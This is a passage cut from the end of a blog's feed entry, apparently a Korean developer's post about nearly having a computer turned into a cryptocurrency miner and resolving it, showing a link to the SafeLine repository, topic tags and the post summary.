<a href="https://github.com/chaitin/SafeLine">SafeLine Github Repository</a></p>]]></content><author><name>Paul2021-R</name></author><category term="학습" /><category term="Frontend" /><category term="NextJS" /><category term="React" /><category term="Security" /><summary type="html"><![CDATA[내 컴퓨터가 채굴기가 될 뻔했….지만 해결기]]></summary></entry></feed>